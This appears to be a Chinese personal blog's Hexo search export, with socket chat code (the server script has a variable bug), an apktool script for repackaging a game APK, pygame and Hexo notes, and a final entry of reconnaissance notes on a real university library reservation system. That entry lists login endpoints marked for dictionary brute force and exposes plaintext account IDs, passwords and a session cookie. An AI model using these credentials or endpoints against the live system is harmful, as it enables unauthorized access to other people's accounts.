#获取本地主机名</li></ul><ol><li>服务端代码</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">laguage=&#123;<span class="string">&#x27;what is you name?&#x27;</span>:<span class="string">&#x27;q0o0p&#x27;</span>,<span class="string">&#x27;how old are you?&#x27;</span>:<span class="string">&#x27;I am 22&#x27;</span>,<span class="string">&#x27;bye&#x27;</span>:<span class="string">&#x27;bey!&#x27;</span>&#125;</span><br><span class="line">HOST=<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT= <span class="number">6666</span></span><br><span class="line">a=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((HOST,PORT))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Listing at port 6666!&#x27;</span>)</span><br><span class="line">conn,addr=s.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Connect by:&#x27;</span>,addr)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data=conn.recv(<span class="number">1024</span>)</span><br><span class="line">    data=data.decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Received message:&#x27;</span>,data)</span><br><span class="line">    conn.sendall(laguage.get(data,<span class="string">&#x27;Nothing&#x27;</span>).encode())</span><br><span class="line">conn.close()</span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,sys</span><br><span class="line">HOST=<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT=<span class="number">6666</span></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s.connect((HOST,PORT))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;server not find!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c=<span class="built_in">input</span>(<span class="string">&#x27;YOU SAY!&#x27;</span>)</span><br><span class="line">    s.sendall(c.encode())</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Received:&#x27;</span>,data)</span><br><span class="line">    <span class="keyword">if</span> c.lower()==<span class="string">&#x27;再见&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><hr><h2 id="apk编译-反编译小工具-继续更新中…"><a href="#apk编译-反编译小工具-继续更新中…" class="headerlink" title="apk编译-反编译小工具(继续更新中…)"></a>apk编译-反编译小工具(继续更新中…)</h2><p>F:\tool\read_activity</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(result.read(1024))</span></span><br><span class="line"><span class="comment"># 返回的结果是一个&lt;class &#x27;os._wrap_close&#x27;&gt;对象，需要读取后才能处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execCmd</span>(<span class="params">cmd</span>):</span>  </span><br><span class="line">    r = os.popen(cmd)  </span><br><span class="line">    text = r.read(<span class="number">1024</span>)  </span><br><span class="line">    r.close()  </span><br><span class="line">    <span class="keyword">return</span> text  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apktool_d</span>(<span class="params">apk</span>):</span></span><br><span class="line">    apktool=<span class="string">&quot;java -jar Apktool_2.5.0.jar d &quot;</span>+apk+<span class="string">&#x27; -o F:/apk/u0o0u&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(apktool)</span><br><span class="line">    r = os.popen(apktool)</span><br><span class="line">    text = r.read(<span class="number">1024</span>) </span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> text </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">apktool_b</span>(<span class="params">apk_mkdir</span>):</span></span><br><span class="line">    apktool=<span class="string">&quot;java -jar Apktool_2.5.0.jar b &quot;</span>+apk_mkdir+<span class="string">&quot; -o F:/apk/wow.apk&quot;</span></span><br><span class="line">    r = os.popen(apktool)</span><br><span class="line">    text = r.read(<span class="number">1024</span>) </span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> text     </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeFile</span>(<span class="params">filename, data</span>):</span>  </span><br><span class="line">    f = <span class="built_in">open</span>(filename, <span class="string">&quot;w&quot;</span>)  </span><br><span class="line">    f.write(data)  </span><br><span class="line">    f.close()  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    cmd = <span class="string">&quot;adb -s fea4b345 shell dumpsys activity top &quot;</span>  </span><br><span class="line">    <span class="comment"># cmd1 = &quot;adb devices &quot;  </span></span><br><span class="line">    <span class="comment"># result1 = execCmd(cmd1) </span></span><br><span class="line">    <span class="comment"># cmd = &quot;adb -s fea4b345 install F:/apk/植物大战僵尸2_2.6.3.apk &quot;  </span></span><br><span class="line">    <span class="comment"># result = execCmd(cmd) </span></span><br><span class="line">    pat1 = <span class="string">&quot;ACTIVITY (.*?)/. &quot;</span>  </span><br><span class="line">    <span class="comment"># pat2 = &quot;IP Address[\. ]+: ([\.\d]+)&quot;  </span></span><br><span class="line">    <span class="comment"># ACTIVITY = re.findall(pat1, result)      # 找到ACTIVITY   </span></span><br><span class="line">    <span class="comment"># IP = re.findall(pat2, result)[0]        # 找到IP  </span></span><br><span class="line">    <span class="comment"># print(&quot;MAC=%s, IP=%s&quot; %(MAC, IP))  </span></span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line">    <span class="comment"># write=writeFile(&#x27;1.txt&#x27;,result)</span></span><br><span class="line">    apk=<span class="string">&#x27;F:/apk/植物大战僵尸2_2.6.3.apk&#x27;</span></span><br><span class="line">    apk_mkdir=<span class="string">&#x27;F:/apk/u0o0u&#x27;</span></span><br><span class="line">    <span class="comment"># result_apktool=apktool_d(apk)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># result_apktool=apktool_b(apk_mkdir)</span></span><br><span class="line">    <span class="comment"># print(result_apktool)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;success!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(os.popen(cmd).read(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="python-小游戏-咕咕咕"><a href="#python-小游戏-咕咕咕" class="headerlink" title="python 小游戏(咕咕咕)"></a>python 小游戏(咕咕咕)</h3><p>pip install pygame -i <a href="https://pypi.douban.com/simple">https://pypi.douban.com/simple</a><br>python加载动态图<br>pip install -i <a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a> pyglet </p><p>引用  初始化  事件处理 窗口刷新</p><p>resources : 图片音乐和音效<br>source文件夹 :<br>    constants.py : 存放游戏中的常量(屏幕宽高,攻击特效,动作)<br>    sound.py : 音乐/音效<br>    setup.py : 启动代码(载入游戏的素材,如初始化,创建屏幕)<br>    tools.py : 工具代码<br>    data文件夹:游戏关卡, 游戏人物资料<br>    components文件夹 : 游戏人物,相关道具<br>        feed : 鱼食<br>        coin : 金币<br>        egg : 关卡结束重点<br>        enemy : 敌人<br>        medicine : 药品<br>        weapon : 武器<br>        player : 玩家<br>        octopus : 章鱼<br>        stuff : 物品<br>        info : 游戏信息(显示分数提示)<br>    states文件夹 : 存放game各个阶段要做的事情<br>        main_menu : 主菜单<br>        load_screen : 载入界面,关卡之间的载入屏幕<br>        level : 关卡</p><hr><p>while True : 无线循环<br>    for event in pygame.event.get()    #取出事件<br>        if event.typw == pygame.QUIT:<br>            sys.exit() #调用函数 退出事件<br>screen = pygame.display.set_mode(size,pygame.RESIZABLE)  //大小可调</p><p>pygame.display.set_mode() //设置屏幕相关信息<br>pygame.display.Info() 生成屏幕相关信息<br>pygame.image.load()  —  从文件加载新图片<br>pygame.image.save()  —  将图像保存到磁盘上<br>pygame.image.get_extended()  —  检测是否支持载入扩展的图像格式<br>pygame.image.tostring()  —  将图像转换为字符串描述<br>pygame.image.fromstring()  —  将字符串描述转换为图像<br>pygame.image.frombuffer()  —  创建一个与字符串描述共享数据的 Surface 对象</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo的简单使用</title>
      <link href="/2018/09/12/hexo-one/"/>
      <url>/2018/09/12/hexo-one/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! Check <a href="https://hexo.io/docs/">documentation</a> . If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a>  <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><p>参考官网：<a href="https://hexo.io/zh-cn">https://hexo.io/zh-cn</a></p><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo s  //hexo server简写</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install https://... -- save  //会把XX安装到node_modules目录中</span><br><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image -- save  //例如插入图片的要安装的插件</span><br><span class="line"> npm update hexo-asset-image --save  //更新插件</span><br></pre></td></tr></table></figure><p>设置站点配置_config.yml:将post_asset_folder: false改为post_asset_folder: true</p><p><img src="%E4%BB%A3%E7%A0%81%E6%B7%BB%E5%8A%A0%E5%9C%B0%E5%9D%801.png"></p><p>安装完成后，再运行hexo n “title”  source/_posts文件夹内除了title.md文件还有一个同名的文件夹</p><p>在title.md中引入图片时，先把图片复制到title这个文件夹中，然后只需要在title.md中按照markdown的格式引入图片：</p><p>! [ 你想输入的替代文字 ] ( title/图片名.jpg )</p><p>最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g -d同步到github</span><br></pre></td></tr></table></figure><h3 id="在GitHub上下载"><a href="#在GitHub上下载" class="headerlink" title="在GitHub上下载"></a>在GitHub上下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/yiluyanxia/hexo-theme-antiquity.git  //例如下载主题</span><br></pre></td></tr></table></figure><h3 id="npm更新"><a href="#npm更新" class="headerlink" title="npm更新"></a>npm更新</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install -g npm-check   </span><br><span class="line">npm -check //检查更新</span><br><span class="line"></span><br><span class="line">npm install -g npm-upgrade</span><br><span class="line">npm-upgrade</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python实现手机版自动答题及拍照(原理及过程)</title>
      <link href="/2018/06/02/py-auto-quest/"/>
      <url>/2018/06/02/py-auto-quest/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>又错过了六一水博客的时间, 今天水一波—&gt;自动答题<br>(至于为什么水这个…看的人都清楚吧)<br>下面开始正文…</p><h2 id="安装模块库"><a href="#安装模块库" class="headerlink" title="安装模块库"></a>安装模块库</h2><p>pip install -i <a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a> pillow<br>pip install -i <a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a> requests<br>已有的自动跳过</p><h2 id="下载adb驱动"><a href="#下载adb驱动" class="headerlink" title="下载adb驱动"></a>下载adb驱动</h2><p>Android Studio自带adb ,没有的自行下载<br>手机截屏:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell screencap -p</span><br></pre></td></tr></table></figure><hr><p>拍照<br>pip install opencv-python -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a><br>pip install itchat -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><hr><p>微信远程控制电脑:<br>pip install matplotlib -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><hr><p>未完待续~~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>frida hook 简单使用</title>
      <link href="/2018/03/23/library/"/>
      <url>/2018/03/23/library/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>所有层当天预约信息: <a href="http://lib2.ecjtu.edu.cn/ClientWeb/pro/ajax/device.aspx?date=20201121&amp;classkind=8&amp;act=get_rsv_sta">http://lib2.ecjtu.edu.cn/ClientWeb/pro/ajax/device.aspx?date=20201121&amp;classkind=8&amp;act=get_rsv_sta</a></p><p>GET /ClientWeb/pro/ajax/login.aspx?act=login&amp;id=2020041007000321&amp;pwd=150266&amp;role=512&amp;aliuserid=&amp;schoolcode=&amp;wxuserid=&amp;_nocache=1624104283914<br>登录,字典爆破</p><p>dev_id=103762589 具体位置预约信息<br>role=512<br>act : login,<br>get_my_resv(查看当前预约信息),如:<br><a href="http://lib2.ecjtu.edu.cn/ClientWeb/pro/ajax/reserve.aspx?stat_flag=9&amp;act=get_my_resv&amp;_nocache=1605938710792">http://lib2.ecjtu.edu.cn/ClientWeb/pro/ajax/reserve.aspx?stat_flag=9&amp;act=get_my_resv&amp;_nocache=1605938710792</a><br>act=del_resv(取消预约)<br><a href="http://lib2.ecjtu.edu.cn/ClientWeb/pro/ajax/reserve.aspx?act=del_resv&amp;id=141095903&amp;_nocache=1605941888031">http://lib2.ecjtu.edu.cn/ClientWeb/pro/ajax/reserve.aspx?act=del_resv&amp;id=141095903&amp;_nocache=1605941888031</a></p><p>GET /ClientWeb/pro/ajax/reserve.aspx?act=del_resv&amp;id=141086066&amp;_nocache=1605943767971 HTTP/1.1</p><p>act=resv_leave(提前结束)<br>/ClientWeb/pro/ajax/reserve.aspx?act=resv_leave&amp;type=2&amp;resv_id=141100887&amp;_nocache=1605942654940 </p><p>act=get_rsv_sta<br>当前XX厅详细信息:<br><a href="http://lib2.ecjtu.edu.cn/ClientWeb/pro/ajax/device.aspx?right=detail&amp;fr_all_day=false&amp;room_id=103762313&amp;name=%E7%BB%8F%E6%B5%8E%E5%8E%85%EF%BC%88409%EF%BC%89&amp;open_start=700&amp;open_end=2200&amp;classkind=8&amp;date=2020-11-21&amp;start=15:30&amp;end=17:30&amp;act=get_rsv_sta&amp;fr_start=19:30&amp;fr_end=21:40&amp;_nocache=1605944105345">http://lib2.ecjtu.edu.cn/ClientWeb/pro/ajax/device.aspx?right=detail&amp;fr_all_day=false&amp;room_id=103762313&amp;name=%E7%BB%8F%E6%B5%8E%E5%8E%85%EF%BC%88409%EF%BC%89&amp;open_start=700&amp;open_end=2200&amp;classkind=8&amp;date=2020-11-21&amp;start=15:30&amp;end=17:30&amp;act=get_rsv_sta&amp;fr_start=19:30&amp;fr_end=21:40&amp;_nocache=1605944105345</a></p><p>/ClientWeb/pro/ajax/reserve.aspx?dev_id=103762590&amp;lab_id=103762299&amp;room_id=&amp;kind_id=100531888&amp;type=dev&amp;prop=&amp;test_id=&amp;resv_id=&amp;term=&amp;min_user=&amp;max_user=&amp;mb_list=&amp;classkind=&amp;start=2020-11-21%2015:50&amp;end=2020-11-21%2021:50&amp;memo=&amp;act=set_resv&amp;_nocache=1605944618962 HTTP/1.1</p><p>dev_id=103762632 (座位号)<br>accno   “103057508”<br>_nocache=1605921473944</p><p>个人信息<br><a href="http://lib2.ecjtu.edu.cn/ClientWeb/pro/ajax/login.aspx?act=login&amp;id=@relogin&amp;pwd=&amp;role=512&amp;_nocache=1605921473944">http://lib2.ecjtu.edu.cn/ClientWeb/pro/ajax/login.aspx?act=login&amp;id=@relogin&amp;pwd=&amp;role=512&amp;_nocache=1605921473944</a></p><p>4FN-A043:<br><a href="http://update.unifound.net/wxnotice/s.aspx?c=103762299_Seat_103762587_1DJ">http://update.unifound.net/wxnotice/s.aspx?c=103762299_Seat_103762587_1DJ</a></p><p>4FN-A045:<br><a href="http://update.unifound.net/wxnotice/s.aspx?c=103762299_Seat_103762589_1DJ">http://update.unifound.net/wxnotice/s.aspx?c=103762299_Seat_103762589_1DJ</a></p><p>4FN-A046:<br><a href="http://update.unifound.net/wxnotice/s.aspx?c=103762299_Seat_103762590_1DJ">http://update.unifound.net/wxnotice/s.aspx?c=103762299_Seat_103762590_1DJ</a></p><p>GET /ClientWeb/m/a/resvsub.aspx?kind=100531888&amp;dev=103762585&amp;lab=103762299&amp;type=dev&amp;date=2020-11-21&amp;start=13:40&amp;end=15:40&amp;classId=103762313&amp;devtype=rm&amp;classkind=8 HTTP/1.1</p><p>GET /ClientWeb/pro/ajax/device.aspx?date=20201121&amp;classkind=8&amp;dev_id=103762585&amp;act=get_rsv_sta&amp;_nocache=1605938306691 HTTP/1.1</p><p>GET /ClientWeb/pro/ajax/reserve.aspx?dev_id=103762585&amp;lab_id=103762299&amp;room_id=&amp;kind_id=100531888&amp;type=dev&amp;prop=&amp;test_id=&amp;resv_id=&amp;term=&amp;min_user=&amp;max_user=&amp;mb_list=&amp;classkind=&amp;start=2020-11-21%2016:00&amp;end=2020-11-21%2022:00&amp;memo=&amp;act=set_resv&amp;_nocache=1605938455014 HTTP/1.1</p><p>DoLogon=true&amp;sysidform=1DJ&amp;aluseridform=9a2e1041-b7d1-4e13-ad17-4349d8a8747c&amp;wxuseridform=&amp;szLogonName=2017512005000119&amp;szPassword=020316<br>Cookie: ASP.NET_SessionId=y3q1ae55oaxzwj45pc1l1grg; safedog-flow-item=4F9AEE669001FA2C93FD54C3EFB735AF</p><p>图书馆ip<br>个人: 120.203.25.245 (江西省南昌市 移动)<br>ecjtu.edu.cn: 202.101.209.228<br>ecjtu.jx.cn:202.101.208.106<br>监控？<a href="http://172.16.6.5/">http://172.16.6.5/</a></p><p>ecjtu.apk   –&gt;   微哨<br>锐捷旗下微哨IM工具存在储存型xss(本地域)影响大量高校<br><a href="https://www.uedbox.com/post/26954/">https://www.uedbox.com/post/26954/</a></p><p>云艺-lib:218.194.205.13</p><p>工具下载:<br><a href="https://www.uedbox.com/tools/">https://www.uedbox.com/tools/</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
